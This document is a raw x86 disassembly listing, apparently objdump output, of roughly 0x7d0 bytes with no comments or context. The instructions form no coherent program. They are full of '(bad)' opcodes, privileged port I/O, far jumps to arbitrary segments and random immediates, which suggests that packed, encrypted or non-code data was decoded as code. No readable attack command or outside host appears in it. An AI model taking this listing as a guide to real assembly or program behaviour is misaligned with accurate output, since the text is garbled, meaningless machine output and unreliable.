  421eeb:	in     al,0xd3
  421eed:	iret   
  421eee:	mov    ecx,0x6ae1ce92
  421ef3:	dec    esp
  421ef4:	stos   DWORD PTR es:[edi],eax
  421ef5:	and    BYTE PTR [eax-0x6ce67f9c],bl
  421efb:	push   0x5e
  421efd:	jne    0x421f06
  421eff:	mov    ecx,DWORD PTR ds:0xe1411ca2
  421f05:	cmp    ah,dh
  421f07:	ret    0xa4bb
  421f0a:	in     eax,0x36
  421f0c:	in     al,dx
  421f0d:	ss call 0x5fa8a036
  421f13:	pop    ebp
  421f14:	call   0x6061:0xb35d0b32
  421f1b:	dec    esi
  421f1c:	pop    ebx
  421f1d:	push   ds
  421f1e:	bound  edi,QWORD PTR [ecx]
  421f20:	jp     0x421f1a
  421f22:	pop    edx
  421f23:	das    
  421f24:	jge    0x421ed1
  421f26:	std    
  421f27:	adc    BYTE PTR [edx],ch
  421f29:	jns    0x421f88
  421f2b:	inc    esi
  421f2c:	ins    BYTE PTR es:[edi],dx
  421f2d:	pop    edi
  421f2e:	jnp    0x421ec9
  421f30:	pop    edi
  421f31:	into   
  421f32:	adc    ebx,esp
  421f34:	icebp  
  421f35:	cli    
  421f36:	dec    ebx
  421f37:	(bad)  
  421f38:	dec    ch
  421f3a:	pop    ds
  421f3b:	je     0x421fb7
  421f3d:	dec    esi
  421f3e:	lods   al,BYTE PTR ds:[esi]
  421f3f:	enter  0xa44,0x4f
  421f43:	sti    
  421f44:	ret    
  421f45:	imul   edi,DWORD PTR [esi-0x7c],0x74
  421f49:	push   edi
  421f4a:	jge    0x421eed
  421f4c:	inc    ebp
  421f4d:	add    DWORD PTR ds:0xc91d1c65,edi
  421f53:	mov    ds:0xb0ea70d7,al
  421f58:	sub    al,0x72
  421f5a:	ret    
  421f5b:	xor    bl,BYTE PTR [edx]
  421f5d:	adc    eax,0x26d8c0e2
  421f62:	call   0x4c192e0d
  421f67:	xchg   ebx,eax
  421f68:	cmp    eax,0xd0159b4e
  421f6d:	daa    
  421f6e:	iret   
  421f6f:	xchg   esp,eax
  421f70:	mov    esp,0x57d34483
  421f75:	xor    al,0x65
  421f77:	adc    esi,DWORD PTR ds:0xcb0ef8a0
  421f7d:	dec    esi
  421f7e:	sbb    ebx,ebx
  421f80:	clc    
  421f81:	out    dx,al
  421f82:	jmp    0x9482:0xa3461ac0
  421f89:	fstp   QWORD PTR [edx-0x5c]
  421f8c:	push   ecx
  421f8d:	enter  0x7e6c,0x53
  421f91:	dec    ecx
  421f92:	neg    BYTE PTR [esi]
  421f94:	repnz jmp 0x20ba:0xe693e47a
  421f9c:	retf   
  421f9d:	aas    
  421f9e:	inc    eax
  421f9f:	jmp    0x70c861dc
  421fa4:	shr    ebp,0x55
  421fa7:	fisub  WORD PTR [ebx+0x1f]
  421faa:	test   al,0xa8
  421fac:	cmp    BYTE PTR [ebx-0x6a],cl
  421faf:	(bad)  
  421fb0:	or     DWORD PTR [ebx+0x19],esp
  421fb3:	jecxz  0x422023
  421fb5:	hlt    
  421fb6:	sub    esi,ebp
  421fb8:	pop    ebp
  421fb9:	or     DWORD PTR es:0x6a00aa94,0x60
  421fc1:	pusha  
  421fc2:	neg    DWORD PTR cs:[esi]
  421fc5:	cmp    eax,0x70b8f610
  421fca:	mov    ch,0x45
  421fcc:	rcr    BYTE PTR [edi-0x13],0x1d
  421fd0:	jp     0x421f8f
  421fd2:	push   ebx
  421fd3:	retf   0x20ae
  421fd6:	xchg   esi,eax
  421fd7:	inc    ebp
  421fd8:	fst    QWORD PTR [edi+ecx*4+0x531717ec]
  421fdf:	xor    BYTE PTR [edi-0x4],bl
  421fe2:	clc    
  421fe3:	cmp    BYTE PTR [edi-0x68901c4c],0xce
  421fea:	push   edx
  421feb:	mov    BYTE PTR [eax-0x5d4c9855],ch
  421ff1:	xor    ch,BYTE PTR [ebp+0x2d]
  421ff4:	jmp    0x421fa9
  421ff6:	xor    dl,dl
  421ff8:	loop   0x422051
  421ffa:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ffc:	mov    ch,0xef
  421ffe:	test   BYTE PTR [ebp+ecx*2-0x397b634e],al
  422005:	push   0x4e
  422007:	dec    eax
  422008:	mov    BYTE PTR [edx-0x1a561631],ch
  42200e:	jo     0x421ff1
  422010:	sub    eax,0xd303b8c
  422015:	adc    edi,DWORD PTR [ecx]
  422017:	fwait
  422018:	lock and al,0xbf
  42201b:	out    dx,al
  42201c:	push   esp
  42201d:	lods   al,BYTE PTR ds:[esi]
  42201e:	jg     0x421ff8
  422020:	mov    ch,0x6d
  422022:	adc    esi,esi
  422024:	adc    eax,edx
  422026:	ds sbb esi,esi
  422029:	lea    ecx,[ebx+0x4c]
  42202c:	out    dx,al
  42202d:	mov    bh,0x88
  42202f:	push   ebp
  422030:	rol    BYTE PTR [esi+0x5e],cl
  422033:	dec    ebp
  422034:	test   BYTE PTR [ecx+0x488e3a95],ch
  42203a:	xlat   BYTE PTR ds:[ebx]
  42203b:	adc    eax,0x1a15a08c
  422040:	or     BYTE PTR fs:[edi],0xde
  422044:	push   eax
  422045:	mov    eax,0x3c9d0be0
  42204a:	lods   al,BYTE PTR ds:[esi]
  42204b:	pop    ebx
  42204c:	or     bh,BYTE PTR [esi+0x7b]
  42204f:	xor    DWORD PTR [ebx+0xe7ff61],eax
  422055:	sbb    esi,DWORD PTR [edi-0x3ec6de9f]
  42205b:	loope  0x4220d3
  42205d:	pop    ss
  42205e:	xchg   edx,eax
  42205f:	and    al,0x7e
  422061:	std    
  422062:	fwait
  422063:	xchg   BYTE PTR [ecx-0x18],bh
  422066:	test   eax,0x6aaf1bb2
  42206b:	push   esp
  42206c:	imul   edi,esp,0x1d
  42206f:	sahf   
  422070:	mov    ebp,0x3ac54af
  422075:	jbe    0x422042
  422077:	ret    0xbed0
  42207a:	jl     0x42200b
  42207c:	inc    ebx
  42207d:	cdq    
  42207e:	sbb    BYTE PTR [eax+0x58],0x88
  422082:	mov    ecx,0x265fc431
  422087:	and    al,0x4
  422089:	sbb    bl,BYTE PTR ds:0xc58aef00
  42208f:	sahf   
  422090:	icebp  
  422091:	pop    ds
  422092:	mov    dl,0x4e
  422094:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422095:	jb     0x4220af
  422097:	cmp    bh,BYTE PTR ds:0xa27f6d98
  42209d:	or     ebx,DWORD PTR [ecx+edx*2-0x2b17cbbf]
  4220a4:	pop    ebp
  4220a5:	mov    ds:0xecb624e5,eax
  4220aa:	and    eax,0xb49ee34c
  4220af:	push   ss
  4220b0:	fcomp  DWORD PTR [esi+0x39f0ed20]
  4220b6:	fcmovb st,st(1)
  4220b8:	dec    esp
  4220b9:	mov    ch,0xf7
  4220bb:	or     BYTE PTR [edx-0x2f],ah
  4220be:	jno    0x42211e
  4220c0:	push   ebp
  4220c1:	shr    DWORD PTR [ebp-0x28c68a8b],0x1d
  4220c8:	in     eax,dx
  4220c9:	ins    BYTE PTR es:[edi],dx
  4220ca:	jecxz  0x422108
  4220cc:	out    dx,al
  4220cd:	data16 scas al,BYTE PTR es:[edi]
  4220cf:	jmp    0x570e:0x68159cd9
  4220d6:	mov    esi,0xce1f4fd
  4220db:	xchg   edx,eax
  4220dc:	(bad)  
  4220dd:	pop    es
  4220de:	xchg   edi,eax
  4220df:	arpl   WORD PTR [esi+0x14],bp
  4220e2:	and    DWORD PTR [ecx-0x1082180],ebp
  4220e8:	mov    BYTE PTR [ebp+0x7d],0xe5
  4220ec:	jl     0x422106
  4220ee:	lods   al,BYTE PTR ds:[esi]
  4220ef:	ror    BYTE PTR [ebp-0x4d],1
  4220f2:	fidiv  DWORD PTR [edx-0x1988c213]
  4220f8:	sbb    esi,ebx
  4220fa:	out    dx,al
  4220fb:	retf   
  4220fc:	out    0xf6,al
  4220fe:	jns    0x42209b
  422100:	push   esp
  422101:	(bad)  
  422102:	ins    BYTE PTR es:[edi],dx
  422103:	clc    
  422104:	add    DWORD PTR [esi],edx
  422106:	push   ss
  422107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422108:	ss cld 
  42210a:	pop    ds
  42210b:	pop    ebp
  42210c:	ins    BYTE PTR es:[edi],dx
  42210d:	xor    ch,BYTE PTR [edi]
  42210f:	out    dx,eax
  422110:	lahf   
  422111:	sub    al,0xf3
  422113:	std    
  422114:	jo     0x422151
  422116:	xchg   ebp,eax
  422118:	dec    edx
  422119:	dec    esp
  42211a:	sub    eax,0xf78e2432
  42211f:	push   ebx
  422120:	pop    ebp
  422121:	and    dh,al
  422123:	pop    ss
  422124:	pusha  
  422125:	adc    cl,BYTE PTR [ebx-0x41]
  422128:	xchg   ebx,eax
  422129:	push   eax
  42212a:	popa   
  42212b:	xor    ebp,DWORD PTR [ebp-0x3d]
  42212e:	mov    eax,0x52fd312e
  422133:	adc    BYTE PTR [ecx-0x76b2841a],ch
  422139:	jmp    0x3ff3:0x29728550
  422140:	(bad)  
  422141:	jae    0x4220ed
  422143:	fistp  QWORD PTR [esi-0x5af2eb32]
  422149:	and    eax,0xe750ee94
  42214e:	fsubr  DWORD PTR [eax-0x64]
  422151:	pop    ebx
  422152:	inc    ecx
  422153:	mov    esp,eax
  422155:	enter  0x706b,0x53
  422159:	cmp    DWORD PTR [ebx+ebx*8+0x3],ebp
  42215d:	mov    edi,0x916f6361
  422162:	test   DWORD PTR [edx-0x7da167cd],ebx
  422168:	jo     0x42218d
  42216a:	push   eax
  42216b:	mov    esi,0xd6de4ae4
  422170:	push   esp
  422171:	pop    esp
  422172:	jb     0x4221a1
  422174:	add    cl,cl
  422176:	stos   BYTE PTR es:[edi],al
  422177:	and    esi,esp
  422179:	cmc    
  42217a:	push   ds
  42217b:	test   BYTE PTR [ecx],cl
  42217d:	jmp    0xccd8288c
  422182:	shl    DWORD PTR [eax-0x3b1e32cd],cl
  422188:	mov    esi,0x6674dd78
  42218d:	mov    bl,0x82
  42218f:	daa    
  422190:	and    al,0xc4
  422192:	call   0xbd558857
  422197:	sub    DWORD PTR [edi-0x21ded6f4],ecx
  42219d:	dec    ecx
  42219e:	or     eax,0x828ec844
  4221a3:	jb     0x4221c6
  4221a5:	repz push edx
  4221a7:	enter  0xc712,0x9c
  4221ab:	ins    DWORD PTR es:[edi],dx
  4221ac:	jmp    0x422188
  4221ae:	imul   ebp,edx,0x1f
  4221b1:	mov    ds:0xd2426456,al
  4221b6:	xchg   ecx,eax
  4221b7:	pop    ss
  4221b8:	mov    ebx,0xbd27303b
  4221bd:	in     al,dx
  4221be:	and    al,0x70
  4221c0:	or     al,0x92
  4221c2:	mov    ch,0x33
  4221c4:	mov    edi,0x708e3c98
  4221c9:	js     0x4221e1
  4221cb:	cli    
  4221cc:	ja     0x422163
  4221ce:	jle    0x4221da
  4221d0:	inc    edi
  4221d1:	out    dx,eax
  4221d2:	or     eax,0xce9c21c6
  4221d7:	in     eax,0x8d
  4221d9:	xchg   edi,eax
  4221da:	xlat   BYTE PTR ds:[ebx]
  4221db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221dc:	cwde   
  4221dd:	ret    0xfdc7
  4221e0:	sub    DWORD PTR [ebx+0xc],ebx
  4221e3:	mov    DWORD PTR [edi+0x20462aeb],eax
  4221e9:	ins    DWORD PTR es:[edi],dx
  4221ea:	fstp   QWORD PTR [edx]
  4221ec:	bound  ecx,QWORD PTR [ebx+0x5e]
  4221ef:	jecxz  0x422189
  4221f1:	rcl    bh,0x5b
  4221f4:	dec    ebp
  4221f5:	pop    esp
  4221f6:	shld   edx,esi,0xd4
  4221fa:	call   FWORD PTR [ecx+ebp*2+0x4e]
  4221fe:	hlt    
  4221ff:	retf   
  422200:	outs   dx,DWORD PTR ds:[esi]
  422201:	loop   0x422220
  422203:	shr    cl,1
  422205:	outs   dx,DWORD PTR ds:[esi]
  422206:	(bad)  
  422209:	cmc    
  42220a:	shld   DWORD PTR [ecx],eax,0xdd
  42220e:	sbb    edi,edx
  422210:	jnp    0x4221fc
  422212:	dec    ebp
  422213:	xchg   BYTE PTR [ecx-0x30],bh
  422216:	test   BYTE PTR [ebp-0x10d56842],bh
  42221c:	cmp    eax,0xf3949d26
  422221:	pop    ecx
  422222:	push   ds
  422223:	push   es
  422224:	nop
  422225:	cld    
  422226:	(bad)  
  422227:	leave  
  422228:	adc    BYTE PTR [eax+0x7355940e],dh
  42222e:	push   es
  42222f:	shr    dh,cl
  422231:	div    ebp
  422233:	push   ebx
  422234:	cmp    ch,BYTE PTR [ebp+0x43e2c695]
  42223a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42223b:	sbb    BYTE PTR [esi+0x4ad47a08],0xb5
  422242:	mov    al,0xc9
  422244:	pop    edx
  422245:	lods   eax,DWORD PTR ds:[esi]
  422246:	mov    WORD PTR [esi+0x5cb1e97],es
  42224c:	sub    esp,DWORD PTR [ecx+0x50]
  42224f:	outs   dx,DWORD PTR ds:[esi]
  422250:	mov    ebp,0x15986631
  422255:	ins    BYTE PTR es:[edi],dx
  422256:	aaa    
  422257:	xor    BYTE PTR [ecx],bl
  422259:	cmp    eax,0x53270d53
  42225e:	pop    ss
  42225f:	icebp  
  422260:	inc    esp
  422261:	(bad)  
  422262:	ficom  WORD PTR [ebp-0x2309012a]
  422268:	mov    ch,BYTE PTR ds:0xda9c6a94
  42226e:	jbe    0x42220f
  422270:	mov    ebp,0xdfbd33f1
  422275:	xor    al,0xf0
  422277:	sub    al,0x2b
  422279:	push   esi
  42227a:	sub    BYTE PTR ds:0x4f85686a,dl
  422280:	fwait
  422281:	out    0xa4,eax
  422283:	call   0x55e3fd87
  422288:	pusha  
  422289:	dec    edi
  42228a:	mov    bh,0x47
  42228c:	(bad)  
  42228d:	sbb    ecx,DWORD PTR [edx]
  42228f:	ds sbb eax,0x5c12cd9d
  422295:	mov    ebp,0x9629e6f7
  42229a:	push   ds
  42229b:	mov    ebx,0xad438592
  4222a0:	mov    eax,0xf2bc46c7
  4222a5:	ror    DWORD PTR [ebp-0x34ed81ef],0x32
  4222ac:	sti    
  4222ad:	and    dh,bl
  4222af:	add    al,0xef
  4222b1:	test   eax,0x9b6e4749
  4222b6:	sbb    BYTE PTR [esi],bl
  4222b8:	mov    dl,0x21
  4222ba:	jno    0x6afc16ea
  4222c0:	or     al,0xa1
  4222c2:	inc    ebx
  4222c3:	add    bl,bl
  4222c5:	xor    DWORD PTR [edx-0x6c32782],ebp
  4222cb:	les    edi,FWORD PTR [ebp-0x35]
  4222ce:	dec    ebx
  4222cf:	xchg   ebp,eax
  4222d0:	je     0x4222e8
  4222d2:	cmp    ah,bl
  4222d4:	push   0x51
  4222d6:	inc    eax
  4222d7:	jmp    0x90e9:0x4613ccbd
  4222de:	or     al,0xd2
  4222e0:	push   0xfffffff3
  4222e2:	fscale 
  4222e4:	adc    DWORD PTR [edx+0x170c5c30],edx
  4222ea:	inc    ebp
  4222eb:	sbb    ch,BYTE PTR [eax-0x7c]
  4222ee:	mov    ebp,0x365e5b09
  4222f3:	mov    edx,0x77712bf0
  4222f8:	jnp    0x42232d
  4222fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222fb:	(bad)  
  4222fc:	int3   
  4222fd:	dec    ebx
  4222fe:	sbb    DWORD PTR [ecx+0x5b],edi
  422301:	and    eax,DWORD PTR [edx]
  422303:	pop    ecx
  422304:	inc    eax
  422305:	fmul   st,st(0)
  422307:	sbb    al,0xee
  422309:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42230a:	dec    ebx
  42230b:	ins    BYTE PTR es:[edi],dx
  42230c:	mov    al,0x3b
  42230e:	mov    ebp,0x5e2b1de3
  422313:	shl    DWORD PTR [ebx+0x45546e43],1
  422319:	cmp    DWORD PTR [ebp-0x7aa78987],eax
  42231f:	sbb    DWORD PTR [edi+0x483a65cd],ebp
  422325:	cmp    BYTE PTR [ebx],bh
  422327:	test   DWORD PTR [ecx+0x5a],0xe869763
  42232e:	add    ah,ah
  422330:	pop    esp
  422331:	dec    ecx
  422332:	ds leave 
  422334:	cmp    BYTE PTR [esi+0x5c306053],dl
  42233a:	xor    DWORD PTR [edi],ebx
  42233c:	bound  ecx,QWORD PTR [ecx+0x60311dc]
  422342:	nop
  422343:	jns    0x422361
  422345:	mov    ecx,0x5a07ee5f
  42234a:	cdq    
  42234b:	sar    BYTE PTR [ecx-0x7465b81f],cl
  422351:	xchg   ebp,eax
  422352:	xor    BYTE PTR [edi],cl
  422354:	test   DWORD PTR [eax+0x2c],edx
  422357:	outs   dx,DWORD PTR ds:[esi]
  422358:	inc    eax
  422359:	mov    dl,0xab
  42235b:	jmp    0x422384
  42235d:	dec    edx
  42235e:	(bad)
  422362:	cs push 0x9f79ca9d
  422368:	mov    eax,ds:0xdff5c3e
  42236d:	mov    edx,0x4548f7f1
  422372:	push   ecx
  422373:	xlat   BYTE PTR ds:[ebx]
  422374:	sub    BYTE PTR [eax-0x6028431],dl
  42237a:	sbb    al,0x86
  42237c:	lea    ebp,[esi+0x30]
  42237f:	call   0xd1ae:0xe66ad000
  422386:	lods   eax,DWORD PTR ds:[esi]
  422387:	ss aam 0x59
  42238a:	inc    edi
  42238b:	icebp  
  42238c:	and    bl,dh
  42238e:	int3   
  42238f:	stc    
  422390:	fdivr  st(1),st
  422392:	inc    ebx
  422393:	mov    dh,dh
  422395:	sbb    BYTE PTR [esi+0x1053311c],0x55
  42239c:	push   ss
  42239d:	pop    ebx
  42239e:	outs   dx,DWORD PTR ds:[esi]
  42239f:	adc    BYTE PTR [ebp+0x185f1d87],bl
  4223a5:	scas   eax,DWORD PTR es:[edi]
  4223a6:	int    0x95
  4223a8:	cmp    eax,0x130d8c49
  4223ad:	shr    DWORD PTR [edx],0x5
  4223b0:	xlat   BYTE PTR ds:[ebx]
  4223b1:	outs   dx,BYTE PTR ds:[esi]
  4223b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223b3:	pop    esp
  4223b4:	not    BYTE PTR [esp+ebp*2]
  4223b7:	or     eax,0xa1eb165d
  4223bc:	and    DWORD PTR [edi+ecx*4],ebp
  4223bf:	jmp    0x42242e
  4223c1:	fcom   DWORD PTR [ebp+0x7d5372e4]
  4223c7:	ds mov ah,0x6b
  4223ca:	sub    dh,BYTE PTR [edx+0x29eb92a9]
  4223d0:	xchg   esp,eax
  4223d1:	std    
  4223d2:	push   esp
  4223d3:	imul   esp,DWORD PTR [ebx],0x42
  4223d6:	pop    edi
  4223d7:	fsubr  QWORD PTR [ecx-0x2b98790c]
  4223dd:	rcr    BYTE PTR [edx-0x79],0xed
  4223e1:	rol    BYTE PTR [ebp-0x2f],0xd0
  4223e5:	rcl    BYTE PTR [edi+0x79],1
  4223e8:	mov    ds:0x985d60c,al
  4223ed:	ja     0x4223b9
  4223ef:	and    edx,DWORD PTR [ebx]
  4223f1:	aad    0x75
  4223f3:	jne    0x4223b1
  4223f5:	aaa    
  4223f6:	dec    edx
  4223f7:	jne    0x422452
  4223f9:	fs push ebx
  4223fb:	(bad)  
  4223fc:	ja     0x422382
  4223fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223ff:	mov    ecx,0xe370b9c3
  422404:	sti    
  422405:	fstp   TBYTE PTR [ebp+0x2]
  422408:	ror    DWORD PTR [ebx+0x60],0x38
  42240c:	ret    
  42240d:	lea    eax,[edx+0x419c9472]
  422413:	enter  0x980b,0xe0
  422417:	dec    esi
  422418:	pop    ecx
  422419:	xor    ecx,0xffffff8e
  42241c:	pop    eax
  42241d:	pop    ecx
  42241e:	mov    esi,0x14b19232
  422423:	out    dx,al
  422424:	jnp    0x4223f7
  422426:	and    al,0x6a
  422428:	add    DWORD PTR [ecx],ebp
  42242a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42242b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42242c:	in     eax,dx
  42242d:	mov    eax,0xfe3e1a46
  422432:	mov    eax,ds:0x170704d3
  422437:	lods   eax,DWORD PTR ds:[esi]
  422438:	daa    
  422439:	inc    edx
  42243a:	push   es
  42243b:	les    eax,FWORD PTR [ecx-0xa]
  42243e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42243f:	bnd jb 0x4224b8
  422442:	retf   0x4ec1
  422445:	xor    al,0xf5
  422447:	xor    ah,bh
  422449:	mov    edi,0x3012b24
  42244e:	adc    ecx,ebx
  422450:	xchg   ah,dh
  422452:	sbb    eax,0x291c840
  422457:	fist   WORD PTR [ebx-0x2874432c]
  42245d:	sub    BYTE PTR [eax+0x3],bh
  422460:	shr    dl,1
  422462:	cmp    ecx,DWORD PTR [edi]
  422464:	sar    DWORD PTR [edx],0xbf
  422467:	or     dh,BYTE PTR [ebp+0x59]
  42246a:	daa    
  42246b:	aam    0x17
  42246d:	pop    ds
  42246e:	mul    eax
  422470:	pushf  
  422471:	and    esp,DWORD PTR [ebp+0x46f12f84]
  422477:	jae    0x42243a
  422479:	mov    ch,0x1a
  42247b:	cmp    edi,DWORD PTR [esi]
  42247d:	jo     0x42243e
  42247f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422480:	xor    eax,0x43d89165
  422485:	pop    ss
  422486:	data16 sub BYTE PTR [esi-0x5a],bh
  42248a:	add    BYTE PTR fs:[ebx+ebx*1-0x47b38ce7],bl
  422492:	repz cmp DWORD PTR [ebp-0x5bba9756],0xfffffff2
  42249a:	repz das 
  42249c:	mov    WORD PTR [edi],ds
  42249e:	mov    eax,ds:0x503e7658
  4224a3:	inc    ebx
  4224a4:	sub    DWORD PTR [ecx],edx
  4224a6:	cwde   
  4224a7:	sti    
  4224a8:	mov    ebx,0x6e4a6e32
  4224ad:	cmp    al,ch
  4224af:	fadd   DWORD PTR [ebp-0x13]
  4224b2:	mov    ds:0xb0a57fba,eax
  4224b7:	inc    ebx
  4224b8:	clc    
  4224b9:	nop
  4224ba:	cs pop eax
  4224bc:	push   edi
  4224bd:	ins    BYTE PTR es:[di],dx
  4224bf:	mov    ds:0xbc0e4ee4,eax
  4224c4:	mov    BYTE PTR [edi],bh
  4224c6:	lods   eax,DWORD PTR ds:[esi]
  4224c7:	in     al,0x69
  4224c9:	scas   al,BYTE PTR es:[edi]
  4224ca:	pop    edx
  4224cb:	loope  0x4224ab
  4224cd:	lock popf 
  4224cf:	jno    0x4224b6
  4224d1:	push   0xffffffb6
  4224d3:	lahf   
  4224d4:	inc    edi
  4224d5:	sti    
  4224d6:	push   cs
  4224d7:	in     eax,0xf3
  4224d9:	pop    edx
  4224da:	sbb    DWORD PTR [ebx+0x1f8a9b54],edi
  4224e0:	add    al,0x14
  4224e2:	dec    esi
  4224e3:	lds    ecx,FWORD PTR [eax+0x58b974f3]
  4224e9:	imul   edx,eax,0x75270c9a
  4224ef:	push   ss
  4224f0:	pop    ebx
  4224f1:	lea    edi,[esi+esi*8-0x44]
  4224f5:	ret    0xe91d
  4224f8:	push   cs
  4224f9:	push   edi
  4224fa:	imul   BYTE PTR [edx]
  4224fc:	inc    esi
  4224fd:	out    dx,eax
  4224fe:	sbb    ebx,DWORD PTR [ebp+0x17a6e0eb]
  422504:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422505:	dec    esi
  422506:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422507:	push   edx
  422508:	cmp    al,0x2b
  42250a:	(bad)  
  42250c:	pop    ds
  42250d:	aam    0x57
  42250f:	or     ebp,DWORD PTR [esp+ecx*4]
  422512:	retf   
  422513:	out    dx,al
  422514:	xor    dh,BYTE PTR [eax+eax*8+0x1bed2879]
  42251b:	in     eax,dx
  42251c:	loop   0x4224dd
  42251e:	daa    
  42251f:	sahf   
  422520:	xchg   edi,eax
  422521:	sub    eax,0xed92d78e
  422526:	test   bh,bh
  422528:	or     eax,0xebcae409
  42252d:	fs and al,0x6b
  422530:	pop    edi
  422531:	(bad)  
  422532:	xchg   edi,eax
  422533:	in     al,0x8a
  422535:	cdq    
  422536:	into   
  422537:	pop    esp
  422538:	and    BYTE PTR [edx+0xf4d1b3b],cl
  42253e:	dec    eax
  42253f:	clc    
  422540:	ds int3 
  422542:	cmp    BYTE PTR ds:[ebp-0x2e6514b8],al
  422549:	cwde   
  42254a:	mov    ecx,0x9671ff7e
  42254f:	push   es
  422550:	mov    ds:0xc9fd7289,eax
  422555:	scas   al,BYTE PTR es:[edi]
  422556:	js     0x422538
  422558:	outs   dx,DWORD PTR ds:[esi]
  422559:	in     eax,0x78
  42255b:	(bad)  
  42255c:	in     al,dx
  42255d:	mov    dl,0x77
  42255f:	imul   eax,DWORD PTR [edi+0x2d1cbbc4],0xffffffa4
  422566:	nop
  422567:	icebp  
  422568:	adc    al,0x27
  42256a:	xor    DWORD PTR [esi],esp
  42256c:	push   eax
  42256d:	test   DWORD PTR [esi],ecx
  42256f:	daa    
  422570:	pop    ebp
  422571:	inc    esp
  422572:	hlt    
  422573:	push   ds
  422574:	jae    0x422508
  422576:	xor    ecx,esp
  422578:	out    dx,eax
  422579:	sub    edx,DWORD PTR [edi]
  42257b:	jns    0x42255c
  42257d:	mov    ss,eax
  42257f:	mov    bh,0xc3
  422581:	stos   DWORD PTR es:[edi],eax
  422582:	aaa    
  422583:	es mov dl,0x7e
  422586:	add    DWORD PTR [esi],eax
  422588:	ret    0x89ee
  42258b:	dec    ebx
  42258c:	lods   eax,DWORD PTR fs:[esi]
  42258e:	cmp    BYTE PTR [esi-0x421721cc],dh
  422594:	pop    eax
  422595:	fsub   QWORD PTR [ebx]
  422597:	sub    BYTE PTR [ecx+0xf43dacb],dh
  42259d:	jmp    0x42256f
  42259f:	pop    esp
  4225a0:	popf   
  4225a1:	fwait
  4225a2:	xchg   esp,eax
  4225a3:	xor    al,BYTE PTR [esi-0x33]
  4225a6:	mov    dh,0x3f
  4225a8:	enter  0xd432,0xd4
  4225ac:	dec    ebp
  4225ad:	jo     0x42259c
  4225af:	mov    ds:0xa771be96,eax
  4225b4:	xrelease lock mov DWORD PTR [eax],eax
  4225b8:	fstenv [edx]
  4225bb:	jb     0x4225f9
  4225bd:	pop    eax
  4225be:	sahf   
  4225bf:	pushf  
  4225c0:	shl    BYTE PTR [esi],1
  4225c2:	addr16 (bad) 
  4225c4:	arpl   WORD PTR [esi+ebp*1],bx
  4225c7:	xlat   BYTE PTR ds:[ebx]
  4225c8:	test   edi,ebx
  4225ca:	xor    DWORD PTR [edi-0x2492d4d2],edx
  4225d0:	cwde   
  4225d1:	adc    al,bh
  4225d3:	jbe    0x42259d
  4225d5:	retf   
  4225d6:	mov    dl,0x1e
  4225d8:	rcl    DWORD PTR [ebx+0x11dcae01],0x15
  4225df:	dec    edi
  4225e0:	mov    ecx,edx
  4225e2:	fisub  DWORD PTR [edi]
  4225e4:	ficom  WORD PTR [ecx+0x9]
  4225e7:	aaa    
  4225e8:	mov    eax,ds:0x45c476de
  4225ed:	ja     0x4225c7
  4225ef:	int3   
  4225f0:	and    DWORD PTR [ebx-0x5],0xffffff82
  4225f4:	enter  0x81d0,0x1f
  4225f8:	xor    al,0x53
  4225fa:	mov    edx,DWORD PTR [edi+0x3839dd9d]
  422600:	mov    edx,DWORD PTR [eax-0x30]
  422603:	sbb    al,BYTE PTR [edi+0x681a4c87]
  422609:	es adc al,0x2b
  42260c:	jle    0x4225d1
  42260e:	loop   0x42268c
  422610:	cwde   
  422611:	and    edx,DWORD PTR [esp+ecx*4]
  422614:	rcl    DWORD PTR [edi+0x2d],1
  422617:	inc    DWORD PTR ds:0x5724fea0
  42261d:	ss push ecx
  42261f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422620:	les    ebx,FWORD PTR ds:0xdc248ebd
  422626:	rcr    DWORD PTR [esi],cl
  422628:	(bad)  
  422629:	frstor [ecx+0x6]
  42262c:	mov    bl,BYTE PTR [edi-0x79abc6a6]
  422632:	sub    eax,0xd0c8cd8e
  422637:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422638:	dec    edx
  422639:	in     eax,dx
  42263a:	mov    edx,0xcc0f14d4
  42263f:	jb     0x42263b
  422641:	int    0xb
  422643:	mul    DWORD PTR [ecx-0x3ca9a66]
  422649:	add    edx,DWORD PTR [ecx]
  42264b:	add    al,0xb6
  42264d:	outs   dx,DWORD PTR fs:[esi]
  42264f:	inc    edx
  422650:	retf   0x327
  422653:	addps  xmm2,XMMWORD PTR ds:0x5d9a294f
  42265a:	add    esp,DWORD PTR [esi+eax*2]
  42265d:	mov    esi,0x152e4b31
  422662:	sbb    eax,DWORD PTR [eax-0x96adbcf]
  422668:	inc    ebp
  422669:	mov    ch,0x6b
  42266b:	int3   
  42266c:	(bad)  [edi+0x4630e7bc]
  422672:	aaa    
  422673:	inc    edx
  422674:	ja     0x422657
  422676:	ret    0x300b
  422679:	pop    ebx
  42267a:	and    BYTE PTR [esi],cl
  42267c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42267d:	lahf   
  42267e:	cmp    DWORD PTR [ebx+0x344ed4f8],esi
  422684:	mov    esi,0xacb344ac
  422689:	xchg   esi,eax
  42268a:	dec    ebx
  42268b:	mov    al,BYTE PTR [edi-0x1d586349]
  422691:	add    ebx,ebp
  422693:	push   ebx
  422694:	and    BYTE PTR [edi+0x63895e17],ah
  42269a:	and    al,0xa5
  42269c:	adc    BYTE PTR [eax+0xdbd55a4],0xd2
  4226a3:	push   ebp
  4226a4:	cs fadd st(2),st
  4226a7:	mov    edx,0x4eb9c893
  4226ac:	mov    ebx,0xec766d10
  4226b1:	jl     0x4226db
  4226b3:	mov    esi,0xd7e4ece0
  4226b8:	sub    cl,BYTE PTR [edi]
